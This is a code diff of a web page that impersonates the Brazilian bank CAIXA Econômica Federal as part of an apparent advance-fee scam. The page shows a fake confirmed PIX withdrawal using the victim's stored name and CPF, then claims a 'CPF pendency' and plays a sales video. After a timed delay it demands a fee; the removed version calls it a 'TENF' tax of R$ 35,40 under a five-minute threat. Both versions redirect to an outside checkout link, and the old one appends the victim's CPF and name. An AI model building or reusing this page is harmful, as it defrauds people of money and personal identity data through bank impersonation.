@@ -5,19 +5,16 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Confirmação de Pagamento - CAIXA ECONÔMICA</title>
 
-  <script>
-    localStorage.setItem("upsell", "up2");
-  </script>
+  <script>localStorage.setItem("upsell", "up2");</script>
 
-  <script src="js/latest_1.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
+  <script src="js/latest_1.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
   <script src="https://cdn.tailwindcss.com"></script>
-  <script src="js/lucide.js"></script>
 
   <style>
-    .status-container { display:flex; flex-direction:column; align-items:center; }
-    .status-icon { display:flex; justify-content:center; margin-bottom:0.5rem; }
-    .status-text { text-align:center; margin-bottom:1rem; }
-    .status-progress { width:100%; }
+    .status-container{display:flex;flex-direction:column;align-items:center}
+    .status-icon{display:flex;justify-content:center;margin-bottom:.5rem}
+    .status-text{text-align:center;margin-bottom:1rem}
+    .status-progress{width:100%}
   </style>
 
   <script>
@@ -25,495 +22,168 @@
       theme: {
         extend: {
           colors: {
-            "caixa-blue2": "#015CA9",
-            "caixa-light-blue2": "#049FD6",
-            "caixa-blue": "#1A65C0",
-            "caixa-light-blue": "#2386D9",
-            "success-green": "#30BF63",
-          },
-        },
-      },
+            caixaBlue2:"#015CA9",
+            caixaLightBlue2:"#049FD6",
+            caixaBlue:"#1A65C0",
+            caixaLightBlue:"#2386D9",
+            successGreen:"#30BF63"
+          }
+        }
+      }
     };
 
-    // Variáveis de controle de tempo (em segundos)
-    const LOADING_DURATION = 2;   // Tempo total do loading
-    const VIDEO_DELAY = 1;        // Tempo para mostrar o vídeo após a pendência
-    const COMPLETE_DELAY = 44;    // Tempo para mostrar o conteúdo completo após o vídeo
+    const LOADING_DURATION = 2;
+    const VIDEO_DELAY = 1;
+    const COMPLETE_DELAY = 44;
   </script>
 
-  <script src="js/latest.js" data-utmify-prevent-subids="" async defer></script>
+  <script src="js/latest.js" data-utmify-prevent-subids async defer></script>
 </head>
 
 <body class="bg-[#EDF6FF] min-h-screen">
-  <!-- Header Azul -->
-  <div class="bg-gradient-to-r from-caixa-blue2 to-caixa-light-blue2 text-white pt-2 pb-8 px-4 mb-2">
-    <!-- Topo com logo -->
-    <div class="flex justify-between items-center mb-5 pb-2 relative">
-      <div class="flex items-center">
-        <img src="/upsell1/images/logocaixa.png" alt="Logo CAIXA tem!" class="h-8 rounded" />
-      </div>
-      <div class="absolute bottom-0 left-[-1rem] right-[-1rem] h-0.5 bg-white bg-opacity-20"></div>
-    </div>
 
-    <!-- Informações do usuário -->
-    <div class="flex items-center mb-4">
-      <div class="size-8 bg-white bg-opacity-20 rounded-full flex items-center justify-center mr-2">
-        <i data-lucide="user" class="size-5 text-white" stroke-width="2"></i>
-      </div>
-      <div>
-        <h1 class="text-base font-medium" id="userGreeting">Olá, --!</h1>
-        <p class="text-sm opacity-90" id="userCpf">---</p>
-      </div>
-    </div>
+<!-- HEADER -->
+<div class="bg-gradient-to-r from-caixaBlue2 to-caixaLightBlue2 text-white pt-2 pb-8 px-4 mb-2">
 
-    <!-- Valor disponível -->
-    <div class="text-center">
-      <p class="text-base opacity-90">Saldo disponível</p>
-      <p class="text-xl font-bold" id="saldoDisponivel">R$ --</p>
+  <div class="flex items-center mb-4">
+    <div class="w-8 h-8 bg-white bg-opacity-20 rounded-full flex items-center justify-center mr-2">
+      <img src="/upsell1/images/usuario.png" class="w-4 h-4" />
+    </div>
+    <div>
+      <h1 id="userGreeting" class="text-base font-medium">Olá, --!</h1>
+      <p id="userCpf" class="text-sm opacity-90">---</p>
     </div>
   </div>
 
-  <!-- Conteúdo principal -->
-  <div class="px-4 py-6">
-    <div class="bg-white rounded-md shadow-lg p-4 pb-6 -mt-4 relative">
-      <!-- Estado inicial: Confirmação -->
-      <div id="confirmationState">
-        <div class="flex justify-center mb-2">
-          <div class="size-8 bg-caixa-light-blue rounded-full flex items-center justify-center">
-            <i data-lucide="check" class="size-4 text-white" stroke-width="6"></i>
-          </div>
-        </div>
+  <div class="text-center">
+    <p class="text-base opacity-90">Saldo disponível</p>
+    <p id="saldoDisponivel" class="text-xl font-bold">R$ --</p>
+  </div>
+</div>
 
-        <div class="text-center mb-6 space-y-2">
-          <h2 class="text-base font-bold text-caixa-light-blue">Pagamento Confirmado!</h2>
-          <p class="text-gray-700 leading-relaxed text-xs">
-            Sua atenticidade foi confirmada com sucesso! Clique no botão abaixo para confirmar a transferência
-            na sua chave pix cadastrada.
-          </p>
-        </div>
+<!-- CONTEÚDO -->
+<div class="px-4 py-6">
+<div class="bg-white rounded-md shadow-lg p-4 pb-6 -mt-4 relative">
 
-        <button onclick="handleConfirmation()" class="w-full bg-success-green hover:bg-green-600 text-white font-medium py-2 px-6 rounded-md transition-colors duration-200 text-base">
-          CONFIRMAR SAQUE
-        </button>
-      </div>
+<!-- CONFIRMAÇÃO -->
+<div id="confirmationState">
 
-      <!-- Estado de status -->
-      <div id="statusState" class="hidden">
-        <div class="status-container">
-          <div id="statusIcon" class="status-icon">
-            <img id="statusImage" src="images/15.png" alt="Ícone" class="size-6" />
-          </div>
-          <div id="statusText" class="status-text">
-            <h2 class="text-sm font-bold text-caixa-light-blue">Transferindo...</h2>
-          </div>
-          <div id="statusProgress" class="status-progress">
-            <div class="w-full bg-gray-200 rounded-full h-2 mb-4">
-              <div id="progressBar" class="bg-gradient-to-r from-caixa-blue to-caixa-light-blue h-2 rounded-full transition-all ease-out" style="width: 0%"></div>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <!-- Estado do vídeo explicativo -->
-      <div id="videoState" class="hidden">
-        <!-- Título principal -->
-        <div class="text-center mb-4">
-          <h2 id="cpfPendenciaTitle" class="text-base font-bold text-caixa-light-blue mb-2">
-            Foi identificado uma pendência no seu CPF!
-          </h2>
-          <p class="text-gray-700 text-sm leading-relaxed">
-            Assista o vídeo explicativo para a liberação da sua transferência.
-          </p>
-        </div>
-
-        <!-- Vídeo -->
-        <div class="w-full bg-gray-200 rounded-lg overflow-hidden mb-4" style="aspect-ratio: 16/9; position: relative;">
-          <div class="w-full h-full flex items-center justify-center bg-gray-300" style="position: relative;">
-            <video id="main-video-up1" src="/upsell1/media/vsl.mp4" preload="metadata" playsinline style="width: 100%; height: 100%; object-fit: cover;"></video>
-
-            <!-- Overlay Pulsante para Ativar Som -->
-            <div id="video-sound-overlay-up1" style="position:absolute; top:0; left:0; width:100%; height:100%; background:transparent; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:1000; cursor:pointer; transition:opacity 0.3s ease;">
-              <div style="text-align:center; animation:pulse 2s ease-in-out infinite;">
-                <div style="width:80px; height:80px; margin:0 auto 20px; background:#FF0000; border-radius:50%; display:flex; align-items:center; justify-content:center; box-shadow:0 0 30px rgba(255,0,0,0.6), 0 0 60px rgba(255,0,0,0.4); animation:pulse-ring 2s ease-in-out infinite;">
-                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3)); margin-left: 2px;">
-                    <path d="M8 5v14l11-7z" fill="white"></path>
-                  </svg>
-                </div>
-                <p style="color:white; font-size:18px; font-weight:600; margin:0; text-shadow:2px 2px 8px rgba(0,0,0,0.8); font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
-                  Clique para ouvir
-                </p>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <style>
-          @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-          @keyframes pulse-ring {
-            0% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.6), 0 0 60px rgba(255, 0, 0, 0.4); }
-            50% { box-shadow: 0 0 50px rgba(255, 0, 0, 0.8), 0 0 100px rgba(255, 0, 0, 0.6); }
-            100% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.6), 0 0 60px rgba(255, 0, 0, 0.4); }
-          }
-          #video-sound-overlay-up1:hover div > div { transform: scale(1.1); transition: transform 0.2s ease; }
-          #video-sound-overlay-up1:hover div { animation-duration: 1s; }
-        </style>
-
-        <script>
-          (function(){
-            var overlay = document.getElementById('video-sound-overlay-up1');
-            var video = document.getElementById('main-video-up1');
-            var videoState = document.getElementById('videoState');
-
-            if (!video) return;
-
-            function startVideo() {
-              if (!video || video.hasStarted) return;
-              video.hasStarted = true;
-              video.loop = false;
-              video.muted = false;
-
-              var playPromise = video.play();
-
-              if (playPromise !== undefined) {
-                playPromise.then(function() {
-                  setTimeout(function() {
-                    if (video.muted) {
-                      video.muted = false;
-                      video.volume = 1.0;
-                    }
-                    setTimeout(function(){ unmuteAndHide(false); }, 2000);
-                  }, 1000);
-                }).catch(function(error) {
-                  console.log('Autoplay bloqueado, iniciando mutado:', error);
-                  video.muted = true;
-                  video.play().catch(function(e){ console.log('Erro ao reproduzir vídeo mutado:', e); });
-
-                  setTimeout(function() {
-                    video.muted = false;
-                    video.volume = 1.0;
-                    setTimeout(function(){ unmuteAndHide(false); }, 1000);
-                  }, 3000);
-                });
-              }
-            }
-
-            function unmuteAndHide(resetVideo) {
-              if (video) {
-                video.muted = false;
-                video.volume = 1.0;
-                if (resetVideo) {
-                  video.currentTime = 0;
-                }
-              }
-              if (overlay && overlay.style.display !== 'none') {
-                overlay.style.opacity = '0';
-                setTimeout(function() { overlay.style.display = 'none'; }, 300);
-              }
-            }
-
-            if (videoState) {
-              var observer = new MutationObserver(function(mutations) {
-                mutations.forEach(function(mutation) {
-                  if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
-                    if (!videoState.classList.contains('hidden')) {
-                      startVideo();
-                    }
-                  }
-                });
-              });
-
-              observer.observe(videoState, { attributes: true, attributeFilter: ['class'] });
-            }
-
-            if (overlay) {
-              overlay.addEventListener('click', function() {
-                if (!video.hasStarted) startVideo();
-
-                if (video.muted) {
-                  unmuteAndHide(true);
-                  video.play().catch(function(e){ console.log('Erro ao reproduzir vídeo:', e); });
-                } else {
-                  unmuteAndHide(false);
-                }
-              });
-
-              video.addEventListener('volumechange', function() {
-                if (!video.muted && overlay.style.display !== 'none') {
-                  unmuteAndHide(false);
-                }
-              });
-
-              video.addEventListener('playing', function() {
-                if (!video.muted && overlay.style.display !== 'none') {
-                  setTimeout(function(){ unmuteAndHide(false); }, 500);
-                }
-              });
-
-              video.addEventListener('ended', function() {
-                try {
-                  video.pause();
-                  video.currentTime = Math.max(0, video.duration);
-                } catch (e) {}
-              });
-            }
-          })();
-        </script>
-
-        <!-- Estado completo (TENF) -->
-        <div id="completeState" class="hidden">
-          <div class="bg-yellow-50 border-l-4 border-[#FA9E1E] rounded-lg p-3 mb-4">
-            <h3 class="text-[#856404] font-bold text-sm mb-2">TENF (Taxa de Emissão de Nota Fiscal)</h3>
-            <p class="text-[#856404] text-sm leading-relaxed">
-              Para você receber o seu prêmio, é necessário efetuar o pagamento da Taxa de Emissão de Nota Fiscal.
-              Caso o pagamento não seja confirmado nos próximos 5 minutos, o seu saque será cancelado e
-              transferido para fins públicos.
-            </p>
-          </div>
-
-          <div class="bg-[#E9FAFF] rounded-lg p-3 mb-4 text-zinc-600">
-            <div class="flex justify-between items-center py-1">
-              <span class="text-caixa-light-blue text-sm font-bold">Valor a receber:</span>
-              <span class="font-medium text-sm" id="valorReceber">R$ --</span>
-            </div>
-            <div class="flex justify-between items-center py-1">
-              <span class="text-caixa-light-blue text-sm font-bold">Valor da Taxa:</span>
-              <span class="font-medium text-sm">R$ 35,40</span>
-            </div>
-            <div class="flex justify-between items-center py-1">
-              <span class="text-caixa-light-blue text-sm font-bold">Liberação da transferência:</span>
-              <span class="font-medium text-sm">Imediatamente</span>
-            </div>
-          </div>
-
-          <div class="text-center mb-4">
-            <p class="text-gray-700 text-sm leading-relaxed">
-              A <strong>Taxa TENF</strong> já foi vinculado a sua conta, efetue o pagamento da taxa
-              clicando no botão abaixo e libere o seu saque no mesmo segundo.
-            </p>
-          </div>
-
-          <button onclick="handlePayment()" class="w-full bg-success-green hover:bg-green-600 text-white font-medium py-3 px-6 rounded-md transition-colors duration-200 text-base">
-            Efetuar o pagamento do Imposto
-          </button>
-        </div>
-      </div>
+  <div class="flex justify-center mb-2">
+    <div class="w-8 h-8 bg-caixaLightBlue rounded-full flex items-center justify-center">
+      <img src="/upsell1/images/confirmar.png" class="w-4 h-4" />
     </div>
   </div>
 
-  <script>
-    // Inicializar ícones do Lucide
-    try { lucide.createIcons(); } catch(e) {}
+  <div class="text-center mb-6 space-y-2">
+    <h2 class="text-base font-bold text-caixaLightBlue">Pagamento Confirmado!</h2>
+    <p class="text-gray-700 text-xs leading-relaxed">
+      Sua autenticidade foi confirmada. Clique abaixo para confirmar o saque via PIX.
+    </p>
+  </div>
 
-    // ---------------- Helpers ----------------
-    function getURLParams() {
-      var params = new URLSearchParams(window.location.search);
-      return Object.fromEntries(params.entries());
-    }
+  <button onclick="handleConfirmation()"
+    class="w-full bg-successGreen text-white font-medium py-2 rounded-md">
+    CONFIRMAR SAQUE
+  </button>
+</div>
 
-    function onlyDigits(v) { return (v || "").toString().replace(/\D/g, ""); }
+<!-- STATUS -->
+<div id="statusState" class="hidden">
+  <div class="status-container">
+    <div class="status-icon">
+      <img src="/upsell1/images/pix.png" class="w-6 h-6" />
+    </div>
+    <div class="status-text">
+      <h2 class="text-sm font-bold text-caixaLightBlue">Transferindo...</h2>
+    </div>
+    <div class="status-progress">
+      <div class="w-full bg-gray-200 rounded-full h-2">
+        <div id="progressBar"
+          class="bg-gradient-to-r from-caixaBlue to-caixaLightBlue h-2 rounded-full"
+          style="width:0%"></div>
+      </div>
+    </div>
+  </div>
+</div>
 
-    function formatarCPF(cpf) {
-      var cpfLimpo = onlyDigits(cpf);
-      if (cpfLimpo.length !== 11) return (cpf || "--");
-      return cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
-    }
+<!-- VIDEO -->
+<div id="videoState" class="hidden">
+  <div class="text-center mb-4">
+    <h2 id="cpfPendenciaTitle" class="text-base font-bold text-caixaLightBlue mb-2">
+      Foi identificado uma pendência no seu CPF!
+    </h2>
+    <p class="text-gray-700 text-sm">
+      Assista ao vídeo para liberar sua transferência.
+    </p>
+  </div>
 
-    function getFirstName(fullName) {
-      var name = (fullName || "").toString().replace(/\+/g, " ").trim();
-      if (!name) return null;
-      return name.split(/\s+/)[0] || name;
-    }
+  <video id="main-video-up1" src="/upsell1/media/vsl.mp4" controls class="w-full rounded-lg"></video>
 
-    // number -> "1.234,56"
-    function formatNumberBR(value) {
-      var n = Number(value);
-      if (!isFinite(n)) return null;
-      var negative = n < 0;
-      n = Math.abs(n);
-      var fixed = n.toFixed(2);
-      var parts = fixed.split(".");
-      var integer = parts[0];
-      var decimal = parts[1];
-      var withDots = integer.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-      return (negative ? "-" : "") + withDots + "," + decimal;
-    }
+  <div id="completeState" class="hidden mt-6">
+    <div class="bg-blue-50 rounded-lg p-3 mb-4">
+      <div class="flex justify-between text-sm">
+        <span class="font-bold text-caixaLightBlue">Valor a receber:</span>
+        <span id="valorReceber">R$ --</span>
+      </div>
+    </div>
 
-    function formatCurrencyFromBRString(br) {
-      if (!br) return "R$ --";
-      return "R$ " + br;
-    }
+    <button onclick="handlePayment()"
+      class="w-full bg-successGreen text-white py-3 rounded-md">
+      PAGAR TAXA E RECEBER
+    </button>
+  </div>
+</div>
 
-    // ---------------- UI setters ----------------
-    function setGreeting(nome) {
-      var el = document.getElementById("userGreeting");
-      if (el) el.textContent = "Olá, " + (nome || "--") + "!";
-    }
+</div>
+</div>
 
-    function setCPF(cpf) {
-      var el = document.getElementById("userCpf");
-      if (el) el.textContent = cpf ? formatarCPF(cpf) : "--";
-    }
+<script>
+function onlyDigits(v){return(v||"").replace(/\D/g,"")}
+function formatCPF(c){c=onlyDigits(c);return c.length===11?c.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"):"--"}
+function formatBR(n){n=Number(n);if(!isFinite(n))return null;let f=n.toFixed(2).split(".");return f[0].replace(/\B(?=(\d{3})+(?!\d))/g,".")+","+f[1]}
 
-    function setSaldo(valorBR) {
-      var saldoEl = document.getElementById("saldoDisponivel");
-      var receberEl = document.getElementById("valorReceber");
-      var texto = formatCurrencyFromBRString(valorBR);
-      if (saldoEl) saldoEl.textContent = texto;
-      if (receberEl) receberEl.textContent = texto;
-    }
+document.addEventListener("DOMContentLoaded",()=>{
+  let nome=null,cpf=null
+  try{
+    let du=JSON.parse(localStorage.getItem("dadosUsuario")||"{}")
+    nome=du.nome||localStorage.getItem("nomeUsuario")
+    cpf=du.cpf
+  }catch(e){}
+  let first=nome?nome.split(" ")[0]:"--"
+  document.getElementById("userGreeting").textContent="Olá, "+first+"!"
+  document.getElementById("userCpf").textContent=formatCPF(cpf)
+  document.getElementById("cpfPendenciaTitle").textContent=
+    cpf?`Foi identificado uma pendência no seu CPF: ${formatCPF(cpf)}`:
+    "Foi identificado uma pendência no seu CPF!"
 
-    function atualizarPendenciaCPF(documento) {
-      var el = document.getElementById("cpfPendenciaTitle");
-      if (!el) return;
+  let valor=localStorage.getItem("creditoAprovado")||
+            formatBR(localStorage.getItem("creditoAprovadoValor"))
+  if(valor){
+    document.getElementById("saldoDisponivel").textContent="R$ "+valor
+    document.getElementById("valorReceber").textContent="R$ "+valor
+  }
+})
 
-      var cpfLimpo = onlyDigits(documento);
-      if (cpfLimpo.length !== 11) {
-        el.textContent = "Foi identificado uma pendência no seu CPF!";
-        return;
-      }
+function handleConfirmation(){
+  document.getElementById("confirmationState").classList.add("hidden")
+  document.getElementById("statusState").classList.remove("hidden")
+  let bar=document.getElementById("progressBar")
+  bar.style.transition=`width ${LOADING_DURATION}s`
+  setTimeout(()=>bar.style.width="100%",100)
+  setTimeout(()=>{
+    document.getElementById("statusState").classList.add("hidden")
+    document.getElementById("videoState").classList.remove("hidden")
+  },(LOADING_DURATION+VIDEO_DELAY)*1000)
+  setTimeout(()=>{
+    document.getElementById("completeState").classList.remove("hidden")
+  },(LOADING_DURATION+VIDEO_DELAY+COMPLETE_DELAY)*1000)
+}
 
-      el.textContent = "Foi identificado uma pendência no seu CPF: " + formatarCPF(documento);
-    }
+function handlePayment(){
+  let base="https://www.pay-pagamentos.link/checkout/09c2c107-ab44-4886-b149-6f25e71cda95"
+  window.location.href=base+location.search
+}
+</script>
 
-    // ---------------- Status flow ----------------
-    function updateStatus(imageSrc, text, showProgress) {
-      if (showProgress === undefined) showProgress = false;
-
-      var imageElement = document.querySelector("#statusImage");
-      var textElement = document.querySelector("#statusText h2");
-      var progressContainer = document.querySelector("#statusProgress");
-
-      if (imageElement && imageSrc) imageElement.src = imageSrc;
-
-      if (textElement) {
-        if (text === "Pendência encontrada!") {
-          textElement.innerHTML =
-            '<span style="display:inline-flex;align-items:center;gap:6px;">' +
-              '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="flex-shrink:0;">' +
-                '<path d="M12 9v4M12 17h.01M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>' +
-              "</svg>" +
-              "<span>" + text + "</span>" +
-            "</span>";
-        } else {
-          textElement.textContent = text;
-        }
-      }
-
-      if (progressContainer) {
-        progressContainer.innerHTML = showProgress
-          ? '<div class="w-full bg-gray-200 rounded-full h-2 mb-4">' +
-              '<div id="progressBar" class="bg-gradient-to-r from-caixa-blue to-caixa-light-blue h-2 rounded-full transition-all ease-out" style="width:0%"></div>' +
-            "</div>"
-          : '<div class="w-full bg-gradient-to-r from-caixa-blue to-caixa-light-blue rounded-full h-2 mb-4"></div>';
-      }
-    }
-
-    function handleConfirmation() {
-      document.getElementById("confirmationState").classList.add("hidden");
-      document.getElementById("statusState").classList.remove("hidden");
-
-      updateStatus("", "Transferindo...", true);
-
-      var progressBar = document.getElementById("progressBar");
-      if (progressBar) {
-        progressBar.style.width = "0%";
-        progressBar.style.transitionDuration = LOADING_DURATION + "s";
-        setTimeout(function () { progressBar.style.width = "100%"; }, 100);
-      }
-
-      setTimeout(function () {
-        updateStatus("../assets/icons/16.png", "Pendência encontrada!", false);
-      }, (LOADING_DURATION + 2) * 1000);
-
-      setTimeout(function () {
-        document.getElementById("statusState").classList.add("hidden");
-        document.getElementById("videoState").classList.remove("hidden");
-
-        var headerText = document.querySelector(".text-center p");
-        if (headerText) headerText.textContent = "Aguardando liberação";
-      }, (LOADING_DURATION + 2 + VIDEO_DELAY) * 1000);
-
-      setTimeout(function () {
-        document.getElementById("completeState").classList.remove("hidden");
-      }, (LOADING_DURATION + 2 + VIDEO_DELAY + COMPLETE_DELAY) * 1000);
-    }
-
-    function handlePayment() {
-      var params = new URLSearchParams(window.location.search);
-
-      // garante cpf/nome na URL também (puxa do localStorage se não tiver)
-      try {
-        var du = localStorage.getItem("dadosUsuario");
-        if (du) {
-          var dadosUsuario = JSON.parse(du);
-          if (dadosUsuario && dadosUsuario.cpf && !params.get("cpf")) params.set("cpf", onlyDigits(dadosUsuario.cpf));
-          if (dadosUsuario && dadosUsuario.nome && !params.get("nome")) params.set("nome", dadosUsuario.nome);
-        }
-        var nomeUsuario = localStorage.getItem("nomeUsuario");
-        if (nomeUsuario && !params.get("nome")) params.set("nome", nomeUsuario);
-      } catch (e) {}
-
-      var baseUrl = "https://www.pay-pagamentos.link/checkout/09c2c107-ab44-4886-b149-6f25e71cda95";
-      window.location.href = baseUrl + "?" + params.toString();
-    }
-
-    // ---------------- Bootstrap ----------------
-    document.addEventListener("DOMContentLoaded", function () {
-      // LEAD (padrão do seu funil): dadosUsuario {nome, cpf}
-      var nomeCompleto = null;
-      var cpf = null;
-
-      try {
-        var dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
-        if (dadosUsuarioJSON) {
-          var dadosUsuario = JSON.parse(dadosUsuarioJSON);
-          if (dadosUsuario) {
-            nomeCompleto = (dadosUsuario.nome || "").toString();
-            cpf = (dadosUsuario.cpf || "").toString();
-          }
-        }
-      } catch (e) {}
-
-      // fallback nomeUsuario
-      if (!nomeCompleto) {
-        try { nomeCompleto = localStorage.getItem("nomeUsuario"); } catch (e) {}
-      }
-
-      // fallback URL
-      var urlParams = getURLParams();
-      if (!nomeCompleto && urlParams.nome) nomeCompleto = urlParams.nome;
-      if (!cpf && urlParams.cpf) cpf = urlParams.cpf;
-
-      var firstName = getFirstName(nomeCompleto) || "--";
-      setGreeting(firstName);
-      setCPF(cpf || "--");
-      atualizarPendenciaCPF(cpf || "");
-
-      // VALOR (mesma simulação): creditoAprovado / creditoAprovadoValor
-      var creditoAprovadoBR = null;
-
-      try {
-        var ca = localStorage.getItem("creditoAprovado"); // "1.234,56"
-        if (ca && ca.toString().trim() !== "") {
-          creditoAprovadoBR = ca.toString().trim();
-        } else {
-          var caValor = localStorage.getItem("creditoAprovadoValor"); // number (string)
-          if (caValor !== null && caValor !== undefined && caValor !== "") {
-            var br = formatNumberBR(Number(caValor));
-            if (br) creditoAprovadoBR = br;
-          }
-        }
-      } catch (e) {}
-
-      // fallback por URL (opcional)
-      if (!creditoAprovadoBR && urlParams.valor) {
-        var v = urlParams.valor.toString().replace(/\./g, "").replace(",", ".");
-        var br2 = formatNumberBR(Number(v));
-        if (br2) creditoAprovadoBR = br2;
-      }
-
-      setSaldo(creditoAprovadoBR || null);
-    });
-  </script>
 </body>
 </html>
